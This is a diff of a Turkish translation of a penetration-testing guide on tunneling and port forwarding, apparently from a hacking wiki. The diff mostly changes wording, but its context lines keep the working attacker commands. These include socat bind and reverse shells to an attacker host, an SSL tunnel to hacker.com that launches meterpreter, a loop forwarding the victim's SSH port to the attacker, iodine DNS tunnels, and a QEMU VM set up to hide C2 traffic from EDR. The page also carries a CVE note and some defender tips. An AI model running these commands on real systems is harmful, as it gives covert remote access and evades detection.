@@ -89,12 +89,12 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Güvenlik – Terrapin Saldırısı (CVE-2023-48795)**
-> 2023 Terrapin geri alma saldırısı, bir adam-arada saldırganın erken SSH el sıkışmasını bozmasına ve **herhangi bir yönlendirilmiş kanala** veri enjekte etmesine olanak tanıyabilir ( `-L`, `-R`, `-D` ). Hem istemcinin hem de sunucunun yamanmış olduğundan emin olun (**OpenSSH ≥ 9.6/LibreSSH 6.7**) veya SSH tünellerine güvenmeden önce savunmasız `chacha20-poly1305@openssh.com` ve `*-etm@openssh.com` algoritmalarını `sshd_config`/`ssh_config` içinde açıkça devre dışı bırakın.
+> 2023 Terrapin düşürme saldırısı, bir adam-arada (man-in-the-middle) erken SSH el sıkışmasını bozmasına ve **herhangi bir yönlendirilmiş kanala** ( `-L`, `-R`, `-D` ) veri enjekte etmesine izin verebilir. Hem istemcinin hem de sunucunun yamanmış olduğundan emin olun (**OpenSSH ≥ 9.6/LibreSSH 6.7**) veya SSH tünellerine güvenmeden önce savunmasız `chacha20-poly1305@openssh.com` ve `*-etm@openssh.com` algoritmalarını `sshd_config`/`ssh_config` içinde açıkça devre dışı bırakın.
 
 ## SSHUTTLE
 
-Bir ana bilgisayar üzerinden **ssh** ile tüm **trafik** için bir **alt ağ** üzerinden **tünel** oluşturabilirsiniz.\
-Örneğin, 10.10.10.0/24 adresine giden tüm trafiği yönlendirmek
+Bir ana bilgisayar üzerinden **ssh** ile tüm **trafik**i bir **alt ağa** **tünelleme** yapabilirsiniz.\
+Örneğin, 10.10.10.0/24 adresine giden tüm trafiği yönlendirmek.
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -178,7 +178,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-Bunu [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresindeki sürümler sayfasından indirebilirsiniz.\
+Bunu [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) sürümler sayfasından indirebilirsiniz.\
 **İstemci ve sunucu için aynı sürümü kullanmalısınız.**
 
 ### socks
@@ -267,7 +267,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
 ```
-### Ters shell
+### Ters kabuk
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-**Kimlik doğrulaması yapılmamış bir proxy'yi** atlamak için, kurbanın konsolundaki son satırın yerine bu satırı çalıştırabilirsiniz:
+**Kimlik doğrulaması yapılmamış bir proxy'yi** atlatmak için, kurbanın konsolundaki son satırın yerine bu satırı çalıştırabilirsiniz:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -300,7 +300,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 **/bin/sh konsolu**
 
-Her iki tarafta da: İstemci ve Sunucu için sertifikalar oluşturun.
+Her iki tarafta da: İstemci ve Sunucu için sertifikalar oluşturun
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -316,7 +316,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Yerel SSH portunu (22) saldırgan ana bilgisayarın 443 portuna bağlayın.
+Yerel SSH portunu (22) saldırgan ana bilgisayarın 443 portuna bağlayın
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -387,7 +387,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz dış hizmete yönlendirilmiş yerel bir port bağlar. Ardından, bu port üzerinden tercih ettiğiniz aracı kullanabilirsiniz.\
+Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz dış hizmete yönlendirilmiş olarak yerel bir port bağlar. Ardından, bu port üzerinden tercih ettiğiniz aracı kullanabilirsiniz.\
 Örneğin, 443 portunu yönlendirin.
 ```
 Username Alice
@@ -396,12 +396,12 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Şimdi, örneğin kurban üzerinde **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Saldırgan 2222 numaralı port üzerinden buna bağlanabilirsiniz.\
+Şimdi, örneğin kurban üzerinde **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Buna saldırganın 2222 numaralı portu üzerinden bağlanabilirsiniz.\
 Ayrıca, localhost:443'e bağlanan bir **meterpreter** kullanabilir ve saldırgan 2222 numaralı portta dinliyor olabilir.
 
 ## YARP
 
-Microsoft tarafından oluşturulan bir ters proxy. Bunu burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Microsoft tarafından oluşturulmuş bir ters proxy. Bunu burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNS Tünelleme
 
@@ -415,7 +415,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Tünel çok yavaş olacaktır. Bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:
+Tünel çok yavaş olacak. Bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -532,7 +532,7 @@ Stdout'tan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000
 3 tünel açar:
 
 - 2 TCP
-- 1 HTTP, /tmp/httpbin/ dizininden statik dosya sergilemesi ile
+- 1 HTTP, /tmp/httpbin/ dizininden statik dosyaların sergilenmesiyle
 ```yaml
 tunnels:
 mytcp:
@@ -547,7 +547,7 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tüneli)
 
-Cloudflare’ın `cloudflared` daemon'u, **yerel TCP/UDP hizmetlerini** dışa açan tüneller oluşturabilir ve bu, Cloudflare’ın kenarını buluşma noktası olarak kullanarak, gelen güvenlik duvarı kurallarına ihtiyaç duymadan yapılır. Bu, çıkış güvenlik duvarının yalnızca HTTPS trafiğine izin verdiği ancak gelen bağlantıların engellendiği durumlarda oldukça kullanışlıdır.
+Cloudflare’ın `cloudflared` daemon'u, **yerel TCP/UDP hizmetlerini** dışa açan tüneller oluşturabilir; bu, Cloudflare’ın kenarını buluşma noktası olarak kullanarak, gelen güvenlik duvarı kurallarına ihtiyaç duymadan yapılır. Bu, çıkış güvenlik duvarının yalnızca HTTPS trafiğine izin verdiği ancak gelen bağlantıların engellendiği durumlarda oldukça kullanışlıdır.
 
 ### Hızlı tünel tek satır komutu
 ```bash
@@ -574,11 +574,11 @@ Bağlayıcıyı başlatın:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Çünkü tüm trafik **443 üzerinden dışa çıkıyor**, Cloudflared tüneller, giriş ACL'lerini veya NAT sınırlarını aşmanın basit bir yoludur. İkili dosyanın genellikle yükseltilmiş ayrıcalıklarla çalıştığını unutmayın – mümkünse konteynerler veya `--user` bayrağını kullanın.
+Çünkü tüm trafik ana bilgisayardan **443 üzerinden dışa çıkıyor**, Cloudflared tüneller, giriş ACL'lerini veya NAT sınırlarını aşmanın basit bir yoludur. İkili dosyanın genellikle yükseltilmiş ayrıcalıklarla çalıştığını unutmayın – mümkünse konteynerler veya `--user` bayrağını kullanın.
 
 ## FRP (Hızlı Ters Proxy)
 
-[`frp`](https://github.com/fatedier/frp) **TCP, UDP, HTTP/S, SOCKS ve P2P NAT-delik-delme** destekleyen aktif olarak bakım yapılan bir Go ters proxy'dir. **v0.53.0 (Mayıs 2024)** ile birlikte, bir **SSH Tünel Geçidi** olarak hareket edebilir, böylece bir hedef ana bilgisayar yalnızca stok OpenSSH istemcisini kullanarak bir ters tünel açabilir – ek bir ikili dosyaya gerek yoktur.
+[`frp`](https://github.com/fatedier/frp) **TCP, UDP, HTTP/S, SOCKS ve P2P NAT-delik-delme** destekleyen aktif olarak bakım yapılan bir Go ters proxy'dir. **v0.53.0 (Mayıs 2024)** ile birlikte, bir **SSH Tünel Geçidi** olarak hareket edebilir, böylece bir hedef ana bilgisayar yalnızca stok OpenSSH istemcisini kullanarak ters bir tünel açabilir – ek bir ikili dosya gerekmiyor.
 
 ### Klasik ters TCP tüneli
 ```bash
@@ -614,7 +614,7 @@ Yukarıdaki komut, kurbanın portunu **8080** olarak **attacker_ip:9000** şekli
 
 QEMU’nun kullanıcı modu ağı (`-netdev user`), *host* üzerinde bir TCP/UDP portunu **bağlayan** ve bunu *guest* içine yönlendiren `hostfwd` adlı bir seçeneği destekler. Misafir tam bir SSH daemon'u çalıştırdığında, hostfwd kuralı, tamamen geçici bir VM içinde yaşayan, atılabilir bir SSH jump box sağlar – tüm kötü niyetli etkinlik ve dosyaların sanal disk içinde kalması nedeniyle EDR'den C2 trafiğini gizlemek için mükemmeldir.
 
-### Hızlı bir satırlık
+### Hızlı bir satır
 ```powershell
 # Windows victim (no admin rights, no driver install – portable binaries only)
 qemu-system-x86_64.exe ^
@@ -659,7 +659,7 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ### Defender ipuçları
 
 • Kullanıcı yazılabilir yollarında **beklenmedik QEMU/VirtualBox/KVM ikili dosyaları** için uyarı verin.
-• `qemu-system*.exe`'den kaynaklanan çıkış bağlantılarını engelleyin.
+• `qemu-system*.exe`'den kaynaklanan dış bağlantıları engelleyin.
 • QEMU başlatıldıktan hemen sonra bağlanan nadir dinleme portlarını (2222, 10022, …) araştırın.
 
 ---
